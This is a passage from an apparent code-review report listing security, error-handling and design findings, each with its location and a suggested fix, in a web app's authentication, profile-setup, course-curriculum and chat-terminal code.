- **Smallest fix:** Extract the framework-free logic (branch selection, failure→action mapping, validation) into plain functions the hook calls; keep window/document/router/toast in the hook/screen layer only.
- _Verified DOM/router/timer usage._

### [Low] Unused port/adapter scaffolding shipped as premature generalization (captcha port + rate-limit adapter chain are dead)  `over-engineering` (CONFIRMED)
- **Where:** ports/captcha.port.ts:20-31 (noopCaptchaPort, no consumers) and adapters/supabase-rate-limit.adapter.ts:14-26 → ports/rate-limit.port.ts:20 (chain with no external caller)
- **What breaks:** captcha.port.ts states 'This file exists today to satisfy the architecture-skeleton receipt for Ship 6' and ships a no-op port nothing consumes; engines read captchaToken from their own state. supabaseRateLimitAdapter delegates to rateLimitPort which delegates to RateLimitService — three indirections with no behavior, and grep shows no consumer of either supabaseRateLimitAdapter or rateLimitPort outside their own files (engines call RateLimitService directly). Dead surface that misleads readers about how captcha/rate-limit actually flow. NOTE: the first pass's claim that turnstile-captcha.adapter has 'no caller in scope' is FALSE — it is used by SignInScreen/RegisterScreen/ForgotPasswordScreen; drop that sub-claim.
- **Smallest fix:** Delete noopCaptchaPort, supabase-rate-limit.adapter, and the unused rate-limit.port until a second implementation exists.
- _Corrected: turnstile adapter IS consumed; captcha port + rate-limit chain are dead._

### [Low] Failure classification/action decision is computed twice per failed login across two layers  `under-engineering` (CONFIRMED)
- **Where:** flows/sign-in-password.flow.ts:45-47 (decideFailureActions for beaconKind) vs engine/use-sign-in-engine.ts:338 (decideFailureActions for counters)
- **What breaks:** The flow classifies the error and calls decideFailureActions(code) to pick a beaconKind (:46); the engine independently calls decideFailureActions(flowError.code) again to decide counters (:338). Two callers of the same decision table for the same failure, split across layers. They agree today, but a future change adding a new punitive code can silently desync which layer punishes vs which reports.
- **Smallest fix:** Decide FailureActions once in the flow and return it inside AuthErr so the engine consumes the same decision instead of re-deriving it.
- _Verified two call sites._

### [Low] Signup rate-limit/infra failure is punitive (fail-closed with a device lockout), inconsistent with sign-in's fail-open  `error-handling` (PLAUSIBLE)
- **Where:** src/features/auth/engine/use-register-engine.ts:242 (RateLimitService.peek, no .catch) with catch at :264 → :300-305 (applyServerRateLimitFailure + applyInvalidAttempt)
- **What breaks:** In signup, RateLimitService.peek (:242) is awaited with no .catch inside the try; if the rate-limit service throws (infra outage), control falls to the generic catch (:264) which runs applyServerRateLimitFailure + applyInvalidAttempt — a punitive device lockout — and shows 'We couldn't create your account', even though no signup was attempted. Sign-in deliberately fails OPEN on the same peek (use-sign-in-engine.ts:298); signup effectively fails closed AND punishes. During a rate-limit backend outage, legitimate registrants get locked out for an infra failure they did not cause.
- **Smallest fix:** Wrap the signup peek in a fail-open/degraded default like sign-in, and do not route infra-layer failures through the punitive attempt counter.
- _added-in-verification_

---

## Auth feature: services, testing & UI

### [High] HTTP 403 is classified as invalid_credentials — the one punitive code driving all three lockout counters  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/services/auth-classifier.ts:77
- **What breaks:** Line 77 is literally `if (status === 401 || status === 403) return "invalid_credentials"`. Per auth-failure-policy.ts:45-54, invalid_credentials is the ONLY branch that sets incrementDeviceLockout+recordServerRateLimitFailure+recordCredentialFailureRpc all true. Any 403 from the broker (WAF/geo block, captcha wall, edge-function authz reject, untyped account_locked) punishes the member as if they mistyped their password, driving device lockout and inflating server counters — the exact message-vs-status mis-punishment class the file claims to have killed, reintroduced via status.
- **Smallest fix:** Map 403 to a non-punitive code (service_unavailable/unexpected), or require a typed credential code before emitting invalid_credentials; reserve it for 401 with an explicit credential signal.

### [High] Guardian-consent email for minors (13–17) is collected, validated, then silently dropped — never sent to backend  `under-engineering` (CONFIRMED)
- **Where:** src/features/auth/engine/use-register-engine.ts:251-259 (sessionPort.signUp call) and src/features/auth/services/sign-up.service.ts:20-54; UI at src/features/auth/ui/RegisterScreen.tsx:154-163
- **What breaks:** RegisterScreen renders a REQUIRED parent/guardian email for ages 13–17 with the promise 'We will email your parent or guardian to confirm consent before your account is fully activated' (T&C §2). The engine validates guardianEmail via registerSchema but the signUp call at 251-259 passes only (email,password,firstName,lastName,redirectTo,captchaToken,birthYear) — guardianEmail is never forwarded. signUp itself has no guardianEmail parameter and never writes it to options.data. The legal consent is gathered and thrown away; no guardian is emailed, no minor-onboarding compliance record exists, and the minor proceeds through the normal email-confirmation activation path unrestricted.
- **Smallest fix:** Thread guardianEmail through sessionPort.signUp → signUp into user_metadata (or a dedicated consent record), gate activation on guardian confirmation, and add a test asserting guardianEmail is transmitted for under-18 signups.

### [High] Three writers own session_started_at with divergent shapes; the declared single owner is bypassed  `ownership` (CONFIRMED)
- **Where:** src/features/auth/services/sign-in.service.ts:31-40, src/features/auth/services/session.service.ts:47-60, vs owner src/features/auth/services/auth-storage.service.ts:43-53
- **What breaks:** auth-storage.service.ts is documented as 'the SINGLE module allowed to read or write' AUTH_STORAGE_KEYS.sessionStartedAt and exposes writeSessionStartedAtRaw. But sign-in.service writes the literal "session_started_at" directly as {version,userId,startedAtMs} (no lastActivityAtMs), session.service.writeSessionMarker writes the same literal as {version,userId,startedAtMs} while touchSessionMarker adds lastActivityAtMs — three write paths, none routing through the owner. sign-in's marker omits lastActivityAtMs, so the first idle evaluation after login derives activity from startedAtMs, mis-dating the idle clock; and the promised no-auth-storage-literals ESLint gate is already violated in-tree, so it can never be turned on.
- **Smallest fix:** Route every session_started_at read/write through auth-storage.service with one marker shape; delete the raw sessionStorage writes in sign-in.service and session.service.

### [High] Two live services enforce contradictory idle/max-age session policies  `ownership` (CONFIRMED)
- **Where:** src/features/auth/services/auth-session.service.ts:20-21 vs src/features/auth/services/session.service.ts:32-33
- **What breaks:** auth-session.service declares IDLE_TIMEOUT_MS=30min, MAX_SESSION_AGE_MS=4h and calls itself 'the only legitimate subscriber to onAuthStateChange'; it is wired into src/hooks/use-idle-timeout.ts (a live enforcement path). session.service declares IDLE_SESSION_AGE_MS=60min and MAX_SESSION_AGE_MS=Number.POSITIVE_INFINITY, enforces them inside getSession (lines 252-274, called by AuthContext), AND separately subscribes via onAuthStateChange (line 288). So the idle timeout has no single answer — 30 or 60 min depending on which path fires — and the 4-hour absolute cap documented as an invariant is disabled entirely (Infinity) on the getSession path. Two subscribers, two clocks, one silently missing absolute cap.
- **Smallest fix:** Pick one owner for session-lifetime policy, delete the other's constants/enforcement and its onAuthStateChange subscription, and add a test pinning the effective idle + absolute timeout.

### [High] MFA verifyTotp returns signed_in without confirming AAL2 and with an empty userId  `security` (CONFIRMED)
- **Where:** src/features/auth/services/auth-mfa.service.ts:56-70
- **What breaks:** On mfa.verify() with no error the function immediately markRecentlyVerified() and returns ok({kind:"signed_in", userId:""}). (1) getAal() exists (lines 35-46) but is never called after verify to confirm currentLevel actually reached aal2; the 10s quiet window (isWithinQuietWindow) then SUPPRESSES the corrective re-challenge for 10s if AAL2 didn't stick — the exact 'verified TOTP but session below AAL2 → re-prompt' incident symptom the lockdown test names. (2) userId is hardcoded "": any caller trusting result.value.userId for audit/navigation/profile fetch queries and logs for user "". Blast radius: MFA-enabled admins.
- **Smallest fix:** After verify, confirm getAal()==="aal2" before returning signed_in and before marking the quiet window; return the real user id from the session rather than "".

### [Medium] Signup timeout 'probe' signs the user in and fires real credential attempts against the account; original signUp is never aborted  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/services/sign-up.service.ts:88-135 (probe) and :56-69 (race with no AbortController)
- **What breaks:** On an indeterminate timeout the recovery calls supabase.auth.signInWithPassword({email,password}) to 'discover the true state'. This is not read-only: on success it establishes a real session then throws ACCOUNT_RECOVERED_SIGNED_IN as a side effect, and against a not-yet-created account it issues a genuine credential attempt on the server, incrementing server credential/rate-limit counters for the very email being registered. The original signUp is raced against a timeout Symbol (56-69) with no AbortController, so the late-completing signUp can create the row AFTER the probe concluded 'not created' — a half-committed state with the account created but the UI told the user it wasn't.
- **Smallest fix:** Probe state via a non-mutating endpoint (check-account-identity / a status route), not signInWithPassword; abort the original signUp on timeout before probing.

### [Medium] Server-side session-revocation check is bypassed on any transient RPC error (fails open)  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/services/session.service.ts:227-240
- **What breaks:** is_session_revoked is the documented authoritative kill switch. In getSession, the rpc call is wrapped in try/catch where the catch (238-240) only logs a warn and falls through, leaving the session valid. A session an admin or the user's own sign-out-all-devices revoked continues to work whenever the revocation lookup errors transiently — exactly when you most want fail-closed. A revoked/compromised session survives a network blip.
- **Smallest fix:** Fail closed on revocation-check error for sensitive sessions (return null / force re-auth), or retry before granting access; do not treat an errored revocation check as 'not revoked'.

### [Medium] Token-issued-at falls back to account creation date, corrupting the revocation comparison  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/services/session.service.ts:222-230
- **What breaks:** tokenIssuedAt is expires_at - (expires_in ?? 600); when expires_at is absent it falls back to issuedAt = user.created_at (account creation) or last_sign_in_at. is_session_revoked is then called with a timestamp that can be months old. Depending on the RPC's comparison semantics this either marks every post-creation revocation as applying (spurious forced sign-out of valid users) or never matches (revocation silently ineffective). Any session lacking expires_at is judged against the wrong clock.
- **Smallest fix:** Require a real token-issued timestamp (JWT iat claim) and skip/hard-fail the revocation check rather than substituting created_at.

### [Medium] Idle-timeout security control silently disabled when storage writes are blocked  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/services/sign-in.service.ts:31-39 and auth-storage.service.ts:33-39; consumed at session.service.ts:65-66
- **What breaks:** sign-in.service.writeSessionMarker and auth-storage.writeString swallow all storage failures (comment: 'storage blocked — idle policy will reset on next getSession'). session.service.readSessionMarker treats a missing marker as resetReason:"missing" and getSession (242-250) then RESETS startedAt/lastActivity to now and returns the session every call, so idle and absolute timeouts NEVER fire for any user whose storage is blocked. A shared/kiosk browser in privacy mode keeps an authenticated session alive indefinitely. loginLockout and resetAttempts counters are likewise non-persistent (auth-storage.writeString no-ops), defeating those controls in private browsing.
- **Smallest fix:** Detect unavailable storage and fall back to an in-memory/server-enforced idle clock; do not let a swallowed write turn the idle timeout into a no-op.

### [Medium] Stale sign-in test asserts a call path the implementation abandoned (direct SDK vs adapter)  `under-engineering` (CONFIRMED)
- **Where:** src/features/auth/services/__tests__/sign-in.service.test.ts:70-82 vs src/features/auth/services/sign-in.service.ts:106-110
- **What breaks:** The service calls supabaseSessionAdapter.signInPassword({email,password,captchaToken}) (106-110). The test never mocks the adapter; it mocks supabase.auth.signInWithPassword and asserts it was called with {email,password,options:{captchaToken}} and that setSession was never called (76-82). The test only passes because the un-mocked real adapter happens to forward verbatim to the mocked SDK — a hidden cross-layer coupling. Any legitimate change to the adapter breaks a test in an unrelated file, and the test does not actually verify the service's declared dependency; the service doc-comment ('routes through supabaseSessionAdapter, no setSession') contradicts the test's direct-SDK expectation.
- **Smallest fix:** Mock supabaseSessionAdapter and assert against signInPassword; delete assertions about supabase.auth.signInWithPassword from this service test.

### [Medium] Duplicate MfaChallengeDialog components with incompatible prop contracts  `boundary` (CONFIRMED)
- **Where:** src/features/auth/ui/MfaChallengeDialog.tsx:19-33 vs the one imported at src/features/auth/ui/SignInScreen.tsx:14 (@/components/MfaChallengeDialog), used at SignInScreen.tsx:173
- **What breaks:** SignInScreen imports MfaChallengeDialog from @/components and passes {open,onSuccess,onCancel} driven by e.mfaOpen/e.onMfaSuccess/e.onMfaCancel. The feature-local ui/MfaChallengeDialog exposes an incompatible contract {open,challengeId,error,busy,onSubmit,onCancel} where the entered code is captured and passed to onSubmit. Two same-named MFA dialogs with divergent verification models coexist; the screen uses the components/ one, leaving the ui/ one dead or wired to a different flow. A bug fix or copy change to one leaves the other wrong, and it is unclear which one actually performs TOTP verification.
- **Smallest fix:** Delete the unused dialog and standardize on one component + one prop contract; point SignInScreen at the feature-local component if that is the intended owner.

### [Medium] Sign-in service reaches into web globals (window/navigator) and the database directly  `dependency` (CONFIRMED)
- **Where:** src/features/auth/services/sign-in.service.ts:63-87 (logAdminLoginIfElevated)
- **What breaks:** logAdminLoginIfElevated runs a direct DB read of user_roles (66-71) and writes an audit row via rpc('write_audit_log') (72-83) from inside the sign-in service, reading window.location.origin/pathname and navigator.userAgent (78-80). This violates dependency direction (the service depends on DOM globals — it cannot run outside a browser: edge/SSR/test) and boundary/ownership (role determination and audit-log writing are duplicated here rather than owned by a roles/audit service). If the role model changes, admin-login audit silently stops; and every successful login pays an extra user_roles round-trip on the hot path.
- **Smallest fix:** Move admin-elevation + audit into a roles/audit service that receives request context (origin/path/user-agent) as plain data passed in from the caller, instead of reading globals in the service.

### [Medium] Telemetry record_event RPC is cast to `never`, disabling all type-checking of the incident-replay pipeline  `under-engineering` (CONFIRMED)
- **Where:** src/features/auth/services/auth-telemetry.ts:68-76
- **What breaks:** emitAuthBeacon calls supabase.rpc("record_event" as never, {...} as never). Both the RPC name and its parameter object are cast to never, so any drift in record_event's signature (renamed param, changed sink enum) compiles cleanly and fails only at runtime, where the error is swallowed to a warn (line 76-80). The Auth Funnel dashboard meant to 'replay any login from ops_events' goes dark silently with no CI signal — the observability backbone for the very incident class this section guards. (Also p_actor is hardcoded null, so beacons cannot be attributed to a user.)
- **Smallest fix:** Type the record_event RPC in the generated Supabase types (or a typed wrapper) and remove the `as never` casts so a schema change breaks the build.

### [Medium] Auth prober's sign-in stage uses a password its own run never sets (reset_complete skipped)  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/testing/auth-prober.ts:110-143, shouldPage at :172-177
- **What breaks:** In the cron incarnation Stage 2 reset_complete is hard-coded 'skipped' (113-118), but Stage 3 still signs in with inputs.temporaryPassword (122-127) — a password only ever established by the skipped reset step. Either (a) the temp password is never set, so sign_in errors every run and shouldPage pages admins with a false Critical every ~10 minutes → alert fatigue, or (b) the account has a static baked-in password, in which case the prober never exercises the reset→sign-in path that caused the June incident, giving false confidence in the exact flow it exists to watch.
- **Smallest fix:** Have the cron incarnation drive a real reset_complete (inbox fetcher / test hook) before sign_in, or mark sign_in skipped when reset_complete was skipped so the pager can't fire on a self-inflicted failure.

### [Medium] identity-hint fail-open defeats the google-only reset block whenever the identity service errors  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/services/identity-hint.service.ts:21,25 consumed at request-password-reset.service.ts:29-35
- **What breaks:** On any error/empty response checkAccountIdentity returns {has_password:true, has_google:false} (lines 21 and 25). requestPasswordReset uses has_google && !has_password to block reset emails to Google-only accounts (line 30). Fail-open means whenever check-account-identity is down or errors, a Google-only account is pushed through resetPasswordForEmail, producing a reset link for an account that has no password to reset — user confusion and a support loop, and the google-only guard is effectively best-effort rather than enforced.
- **Smallest fix:** Distinguish 'unknown identity' from 'has password' in the fail-open shape and choose the safe branch deliberately for reset (send generic anti-enumeration copy without generating a password-reset link for confirmed-google accounts).

### [Medium] session.service marker writes are unguarded, so getSession throws for any user whose storage write is blocked  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/services/session.service.ts:47-52 (writeSessionMarker) and :54-60 (touchSessionMarker), invoked at :244 and :275
- **What breaks:** Unlike sign-in.service.writeSessionMarker (which wraps setItem in try/catch) and auth-storage.writeString, session.service.writeSessionMarker and touchSessionMarker call sessionStorage.setItem with NO try/catch. Both are called inside getSession on the normal success path: writeSessionMarker at 244 (whenever resetReason is set — including the 'missing' case that fires on every call under storage partitioning/private mode) and touchSessionMarker at 275 on every valid session. On a browser where setItem throws (Safari private mode, quota exceeded, storage partitioning), getSession throws instead of returning the session — auth bootstrap in AuthContext fails and the user is bounced to logged-out on every navigation. A swallowed-write assumption in one writer coexists with a throwing writer for the same key.
- **Smallest fix:** Wrap both setItem calls in try/catch (or route through auth-storage.writeSessionStartedAtRaw, which already guards), so a blocked storage write degrades to the in-memory idle path rather than crashing getSession.
- _added-in-verification_

### [Medium] signOutAllDevices fails open — swallowed edge error leaves other devices authenticated while reporting done  `security` (CONFIRMED)
- **Where:** src/features/auth/services/session.service.ts:149-179
- **What breaks:** When the sign-out-all-devices edge invoke errors or throws, the catch/else only logs a warn and leaves revocationRecorded=false (159-169); the function then still signs out the LOCAL device (171-174) and returns {revocationRecorded:false, gotrueSignedOut:false} without throwing. The server-side revocation row — the authoritative kill switch other sessions are checked against — was never written, so every other device (including a stolen/compromised one the user is trying to kill) stays authenticated. A caller that does not inspect revocationRecorded shows 'signed out of all devices' while the revocation silently did not happen.
- **Smallest fix:** Treat an edge revoke error as a hard failure: throw (or return a typed failure the UI surfaces) so the user knows other sessions were NOT revoked and can retry; do not report success on a swallowed revocation error.
- _added-in-verification_

### [Low] request-password-reset throws success-worded copy as an Error on GoTrue failure  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/services/request-password-reset.service.ts:41-46
- **What breaks:** On a non-429 GoTrue error the service logs a failure then throws new Error('If an account exists with that email, a reset link has been sent.'). Throwing a success-worded message means any consumer that renders thrown errors as red alerts shows a positive message in an error box, and any consumer that classifies the throw gets 'unexpected'. The tested lockdown flow expects a success result on GoTrue error — so the service's throw and the flow's success contract disagree about whether this is a failure at all.
- **Smallest fix:** Return a normal success outcome (anti-enumeration) instead of throwing; reserve throws for genuine transport failures the flow maps to service_unavailable.

### [Low] Rate-limit cleanup failure after a successful reset can strand the user in a lockout loop  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/services/complete-password-reset.service.ts:108-116
- **What breaks:** After the password is updated, clear_own_auth_rate_limits_after_password_reset is called and its failure is only logged (warn, no retry, no user signal). If the user reached the reset flow because they were rate-limited/locked, a failed cleanup leaves the server counters in place, so the very next sign-in with the brand-new password can be rejected as rate-limited — a 'I just reset it and still can't get in' loop with no recovery path.
- **Smallest fix:** Retry the cleanup, or surface a 'you may need to wait a minute' hint on the success screen when cleanup fails, rather than silently warning.

### [Low] Duplicated readFunctionError and triple-duplicated contract suites invite silent drift  `under-engineering` (CONFIRMED)
- **Where:** src/features/auth/services/sign-in.service.ts:42-61 & complete-password-reset.service.ts:23-42; plus services/__tests__/auth-classifier.contract.test.ts vs testing/contract/auth-classifier.contract.test.ts (same for auth-failure-policy)
- **What breaks:** readFunctionError is copy-pasted ~20 lines across sign-in.service and complete-password-reset.service; a fix to error-body parsing in one (e.g. a new broker envelope) won't reach the other, so sign-in and password-reset will classify the same broker error differently. The classifier and failure-policy each have two near-identical contract files in two directories. Maintenance cost multiplies and the copies can silently diverge, while whole modules (session.service revocation, auth-session policy) have no coverage at all.
- **Smallest fix:** Extract one shared readFunctionError into a lib helper; consolidate each duplicated contract suite into a single location and redirect effort at the untested session-lifecycle paths.

### [Low] Prober counts HTTP 200 as sign-out success regardless of body, unlike every other stage  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/testing/auth-prober.ts:150
- **What breaks:** sign_out uses `r.json.ok || r.status === 200` while reset_request (94) and sign_in (130) trust only r.json.ok. A broker that returns 200 with {ok:false} (a soft-failed sign-out) is recorded as ok for the sign-out stage only, so a real sign-out/revocation regression can never trip the two-strike pager. Inconsistent success criteria across stages of the same synthetic.
- **Smallest fix:** Use one success predicate for all stages (trust the typed ok flag consistently).

### [Low] single-flight setSessionSafe returns the first in-flight promise even when a second call passes different tokens  `other` (CONFIRMED)
- **Where:** src/features/auth/services/auth-flow.service.ts:36-37
- **What breaks:** `if (inFlight) return inFlight` short-circuits before validating the second call's tokens (validation happens at 38-43, after the early return). If two setSession calls race with different token pairs (an OAuth callback and a password sign-in overlapping), the second caller silently receives the session from the first caller's tokens and its own tokens are discarded with no error — a wrong-session/identity-confusion risk on concurrent auth entrypoints. The mutex assumes all concurrent callers want the same session.
- **Smallest fix:** Key the in-flight promise by token pair, or reject a concurrent call whose tokens differ from the in-flight one rather than returning the other session.

### [Low] Revocation RPC runs on every getSession call — a per-navigation DB round-trip gating session validity  `other` (PLAUSIBLE)
- **Where:** src/features/auth/services/session.service.ts:221-240
- **What breaks:** getSession issues supabase.rpc('is_session_revoked', ...) on every invocation where a session exists, and getSession is called on route changes / focus / AuthContext bootstrap. Session validity and the entire idle/absolute-timeout evaluation now sit behind a synchronous DB round-trip on the hot path for the whole member base, adding latency to every authenticated navigation and coupling basic page loads to the availability of that RPC (which, per the fail-open finding, then silently degrades). No caching or debcounce of the revocation result is present.
- **Smallest fix:** Cache the revocation result for a short TTL per (user,issuedAt) or check it only on sensitive transitions rather than on every getSession, so routine navigation does not incur a revocation round-trip.
- _added-in-verification_

---

## Class-curriculum, profile-setup & TAL-9000 features

### [High] profile-setup writes directly to the profiles table, bypassing ProfileService sanitization  `security` (CONFIRMED)
- **Where:** src/features/profile-setup/profile-setup.service.ts:42-45 (autosaveDraft) and :59-62 (complete)
- **What breaks:** Both write paths call supabase.from("profiles").update(safe) directly. deepSanitize() runs ONLY inside ProfileService (profile.service.ts:106,139,182); this path runs none of it. bio/display_name/professional_background/professional_goals submitted with markup persist raw. LearnerCurriculumView sanitizes content_html on render, but profile fields are rendered by other consumers that do not re-sanitize, so attacker-controlled markup renders for whoever views that profile (mentors, admins, 767 members). Confirmed: neither pickAllowedFields nor deepSanitize is imported or called in this file.
- **Smallest fix:** Delete the inline supabase.from("profiles").update() calls; route autosaveDraft and complete through ProfileService (updateFields for drafts, and a ProfileService method that owns setting profile_completed) so allow-listing + sanitization run on every profiles write.

### [High] ProfileDraftFields strips only profile_completed, leaving every other column mass-assignable  `security` (CONFIRMED)
- **Where:** src/features/profile-setup/profile-setup.service.ts:18 (type), :38-41 and :57-58 (runtime strip)
- **What breaks:** ProfileDraftFields = Omit<Partial<Profile>,"profile_completed"> and at runtime the code only does `delete safe.profile_completed`. Every other column is accepted and written verbatim. The contract test (profile-setup.contract.test.ts:30-38) itself proves a caller forces fields past the type system with `as never`. Unlike ProfileService.updateFields there is NO pickAllowedFields allowlist here — if profiles gains (or has) a role/flag/status/membership_tier column and RLS permits self-update, a crafted client request writes it. The Omit type is a compile-time hint masquerading as the runtime allowlist the architecture requires.
- **Smallest fix:** Apply pickAllowedFields(ALLOWED_PROFILE_FIELDS) before any write here (ideally by delegating to ProfileService.updateFields) instead of a TypeScript Omit plus a single runtime delete.

### [Medium] Curriculum helper + release libraries are dead code duplicated inline in the components they exist to serve  `over-engineering` (CONFIRMED)
- **Where:** src/features/class-curriculum/lib/curriculum-helpers.ts (computeProgress, reorderIds, previewVideoProvider) and lib/release.ts (computeRelease, availabilityLabel)
- **What breaks:** Grep confirmed: all five functions are imported ONLY by curriculum-helpers.test.ts and release.test.ts — never by any component. Meanwhile LearnerCurriculumView.tsx:127-130 hand-rolls the required-progress percentage, AvailabilityNote (:48-64) hand-rolls the availability label, and CurriculumEditor uses dnd-kit arrayMove (:175,:192) instead of reorderIds. Two parallel implementations of the same logic that drift silently: a change to progress/lock rules updates one, tests stay green against the unused copy. release.ts/curriculum-helpers.ts are additionally documented as client MIRRORS of server SQL (class_item_release, derive_class_module_video) — an unused mirror of the source of truth with nothing forcing lockstep is pure drift liability.
- **Smallest fix:** Either wire the components to import these helpers (single implementation) or delete the unused functions and their tests. Do not keep a consumed-by-nothing client mirror of server SQL.

### [Medium] TAL-9000 rating write has no error handling and does not revert its optimistic state  `error-handling` (CONFIRMED)
- **Where:** src/features/tal-9000/TalTerminal.tsx:188-195 (rate)
- **What breaks:** rate() sets the local rating optimistically (setRatings) then `await submitRating(...)` with NO try/catch. On rejection (network drop, auth expiry, 500 from feedback) the promise rejection is unhandled and the button still shows Good/Improve as recorded. The failure neither recovers, retries, nor reports — the user believes feedback was saved but it was silently lost, and product-quality signal for Fleety answers is quietly corrupted. Confirmed: no catch anywhere in the callback.
- **Smallest fix:** Wrap the await in try/catch; on failure revert the optimistic ratings entry and surface a toast (report), or retry.

### [Medium] Chat messages keyed by array index cause reconciliation bugs on stream / conversation switch  `other` (CONFIRMED)
- **Where:** src/features/tal-9000/TalTerminal.tsx:386-394 (messages.map key={i})
- **What breaks:** The message list is keyed by index (key={i}) while the array mutates constantly: streaming appends tokens to the last assistant message, reset()/newChat() clears it, loadConversation(id)/pickConversation swaps in a different conversation's messages. Index keys make React reuse DOM/state across semantically different messages, so during streaming or when a user picks a different history entry the terminal can show stale content, a streaming caret on the wrong line, or a MessageBlock rendering the previous conversation's text until fully reconciled. For a persisted, switchable chat this is a visible correctness bug. Confirmed: FleetyMessage carries turnId (used at :230) but the key ignores it.
- **Smallest fix:** Key by a stable per-message id (turnId or a message id from useFleetyChat) instead of the array index.

### [Medium] Curriculum service erases its own type safety with as unknown / as never casts around every table and RPC call  `dependency` (CONFIRMED)
- **Where:** src/features/class-curriculum/services/classCurriculum.service.ts:26 (rpc handle), :53,:61,:81,:182-183,:213 (.from(..."as never")) and throughout
- **What breaks:** Table names are cast `as never`, the rpc handle is rebuilt via `supabase as unknown as { rpc }` (:26), storage via `as unknown as {...}` (:39), and every result cast to a domain type through unwrap<T>. This defeats the generated Supabase types entirely: a typo/drift in a table, column, or RPC name (upsert_class_section, get_class_curriculum_for_learner, release_offset_days, register_class_module_file, etc.) compiles clean and only fails at runtime as a thrown Error surfaced to a toast. This is exactly the recorded PGRST202 Discord-linking outage class (RPC/migration mismatch types would have caught). At 767 users a renamed column ships green and breaks the whole curriculum tab.
- **Smallest fix:** Regenerate and use the typed Supabase client for these tables/RPCs (or add a thin typed wrapper), removing the as never/as unknown casts so schema drift is a compile error.

### [Medium] SectionEditorDialog leaks stale form data between successive New-section opens and carries a dead no-op block  `other` (CONFIRMED)
- **Where:** src/features/class-curriculum/components/SectionEditorDialog.tsx:22-30
- **What breaks:** State is seeded once from props via useState (:22-24) with no open-reset effect; the parent gives it key={sectionDialog.section?.id ?? "new"} (CurriculumEditor.tsx:376). For new sections the key is the constant "new", so the component is NOT remounted between two New-section flows. A teacher who opens New section, types a title, cancels, then opens New section again sees the previous draft's title/summary/status still populated, and can create a section with leftover text. ItemEditorDialog.tsx:66-84 does this correctly with a useEffect keyed on [item, open]; this dialog does not. Lines 27-30 are a dead `if` whose body is a comment admitting a useEffect would loop — confusing residue that reads as if reset is handled when it isn't.
- **Smallest fix:** Reset title/summary/status in a useEffect gated on `open` (mirror ItemEditorDialog:66-84) and delete the dead if-block at :27-30.

### [Medium] Learner progress fetch ignores userId and returns all rows for the class, relying entirely on RLS  `ownership` (PLAUSIBLE)
- **Where:** src/features/class-curriculum/services/classCurriculum.service.ts:79-88 (fetchProgress) vs hooks/useClassCurriculum.ts:17-27 (useClassCurriculumProgress)
- **What breaks:** useClassCurriculumProgress takes userId and keys the React Query cache per-user (classProgressKey), but fetchProgress runs `.from("class_module_progress").select("*").eq("class_id", classId)` with NO user_id filter — it returns whatever RLS allows for the class. The per-user cache key gives a false impression of per-user scoping the query does not enforce. If RLS lets a teacher/admin/editor read all learners' progress (very plausible — teachers need cohort progress), then when such a user opens LearnerCurriculumView (used for editor preview per the service doc) completedSet (LearnerCurriculumView.tsx:120-123) is polluted with EVERY learner's completed item_ids, showing wrong/inflated progress and rendering items as completed the viewer never did. It is also an unbounded fetch (all learners x items, up to ~767 users) for a component that needs only the current user's rows.
- **Smallest fix:** Filter fetchProgress by the current user's id server-side (pass user_id and .eq("user_id", userId), or use a per-user RPC), so the query returns only the caller's progress regardless of RLS breadth.
- _added-in-verification_

### [Medium] Autosave clears the pending draft buffer before the write is confirmed, silently dropping edits on failure  `error-handling` (CONFIRMED)
- **Where:** src/features/profile-setup/use-profile-setup-form.ts:52-65 (flush)
- **What breaks:** flush() sets `draftRef.current = {}` (:55) BEFORE `await ProfileSetupService.autosaveDraft(...)` (:58). If the write rejects (network/auth/RLS error), the catch (:60-62) only sets an error string and never restores draftRef — the buffered field edits are already gone, so autosave will never retry them. The fields survive only in `draft` state and are re-persisted solely if the user later clicks complete (which reads {...draftRef.current, ...draft}); a user who types, hits a transient autosave failure, and closes the dialog without completing loses that work with only a quiet inline error. The safety net silently stops protecting exactly when it's needed.
- **Smallest fix:** Capture the pending buffer, and on failure merge it back into draftRef.current (or don't clear until the await resolves successfully) so a failed autosave is retried on the next debounce.
- _added-in-verification_

### [Medium] complete() marks profile_completed=true with no field validation, bypassing the ProfileInput schema the canonical path enforces  `under-engineering` (CONFIRMED)
- **Where:** src/features/profile-setup/profile-setup.service.ts:57-66 (complete) vs src/services/profile.service.ts:76-123 (ProfileService.update using ProfileInput)
- **What breaks:** complete() writes {...finalFields, profile_completed: true} directly with zero validation of required fields or formats. ProfileService.update validates via a ProfileInput (lib/validators/profile) schema and builds a known-good payload before writing; this completion path runs none of that. A client can flip profile_completed=true with an empty or malformed profile (blank display_name, junk portfolio_url/linkedin_url), and downstream code that trusts profile_completed as 'profile is valid and filled in' (journey gating, Discord onboarding, member directory) then operates on incomplete data. The two completion paths (this service vs ProfileService.update) enforce different — here, no — invariants for the same profile_completed flag.
- **Smallest fix:** Validate finalFields against the same ProfileInput schema (or a shared validator) before setting profile_completed=true, so the completion invariant is enforced identically on both write paths.
- _added-in-verification_

### [Low] profile-setup completion side effects swallow failures with only a warn log  `error-handling` (CONFIRMED)
- **Where:** src/features/profile-setup/profile-setup.service.ts:69-89 (complete -> allSettled, syncJourneyTasks, notifyDiscord)
- **What breaks:** syncJourneyTasks and notifyDiscord each try/catch and only log.warn, and complete() runs them under Promise.allSettled and discards the results. If sync_journey_tasks_for_user fails the new member's journey/onboarding tasks are silently never created and nothing retries or alerts; if notify-profile-completed fails the Discord onboarding notification is silently dropped. Same silent-integration-failure shape as the prior Discord-linking outage — non-blocking is fine, invisible is not. Nothing records these compensating steps need reconciliation.
- **Smallest fix:** Keep the flow non-blocking but report the failures out of band (structured error + a retry/backfill or an alert) rather than a warn log nobody watches.

### [Low] TAL-9000 renders RAG source links with unvalidated href  `security` (CONFIRMED)
- **Where:** src/features/tal-9000/TalTerminal.tsx:670-676 (MessageBlock source anchors, href={u})
